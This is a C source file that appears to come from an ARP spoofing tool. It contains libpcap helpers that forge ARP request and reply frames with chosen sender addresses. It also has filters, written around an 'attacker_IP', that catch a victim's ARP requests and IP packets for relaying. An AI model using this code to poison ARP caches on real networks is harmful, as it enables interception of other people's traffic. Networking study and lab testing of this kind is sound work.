#include "packet.h"
#include "utils.h"
#include "filter.h"
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

int pcap_next_handler(int res, struct pcap_pkthdr *hdr) {
    int flag = SUCCESS;
    switch(res) {
        case 0:
            fprintf(stderr, "[-] Time limit Expired");
            flag = FAIL; break;
        case PCAP_ERROR:
            fprintf(stderr, "[-] Error occured while reading packet");
            flag = FAIL; break;
        case PCAP_ERROR_BREAK:
            fprintf(stderr, "[-] No more packets in savefile");
            flag = FAIL; break;
    }
    return flag;
}

void send_arp(pcap_t *handle, int opcode, BYTE *snd_mac, BYTE *snd_ip, BYTE *trg_mac, BYTE *trg_ip) {
    const BYTE BROADCAST[6] = "\xFF\xFF\xFF\xFF\xFF\xFF";
    const BYTE NULL_ADDR[6] = "\x00\x00\x00\x00\x00\x00";
    ETH eth_hdr; ARP arp_hdr;

    memcpy(eth_hdr.dst_hw_addr, opcode == OP_REQ ? BROADCAST : trg_mac, HW_ADDR_LEN);
    memcpy(eth_hdr.src_hw_addr, snd_mac, HW_ADDR_LEN);
    eth_hdr.eth_type = htons(TYPE_ARP);

    arp_hdr.hw_type = htons(TYPE_ETH); arp_hdr.proto_type = htons(TYPE_IPV4);
    arp_hdr.hw_addr_len = HW_ADDR_LEN; arp_hdr.proto_addr_len = IP_ADDR_LEN;
    arp_hdr.opcode = htons(opcode);
    memcpy(arp_hdr.snd_hw_addr, snd_mac, HW_ADDR_LEN);
    memcpy(arp_hdr.snd_proto_addr, snd_ip, IP_ADDR_LEN);
    memcpy(arp_hdr.trg_hw_addr, opcode == OP_REQ ? NULL_ADDR : trg_mac, HW_ADDR_LEN);
    memcpy(arp_hdr.trg_proto_addr, trg_ip, IP_ADDR_LEN);

    ARP_PKT arp_pkt = { eth_hdr, arp_hdr };
    if(pcap_sendpacket(handle, (const BYTE*)&arp_pkt, sizeof(arp_pkt)) != 0)
        fprintf(stderr, "[-] Failed sending packet\n");
}

int check_request(const BYTE * data, const BYTE *sender_MAC, const BYTE *attacker_IP) {
    return (filter_ARP(OP_REQ, data) == SUCCESS                                     // 1. ARP request
            && filter_src(HW, sender_MAC, data) == SUCCESS                          // 2. Sent by sender
            && filter_dst(PROTO, attacker_IP, data) == FAIL) ? SUCCESS : FAIL;      // 3. Destination IP not mine
}

int check_relay(const BYTE *data, const BYTE *sender_MAC, const BYTE *attacker_IP) {
    return (filter_IP(data) == SUCCESS                                              // 1. ether type is IP
            && filter_src(HW, sender_MAC, data) == SUCCESS                          // 2. 
            && filter_dst(PROTO, attacker_IP, data) == FAIL) ? SUCCESS : FAIL;      // 3. 
}
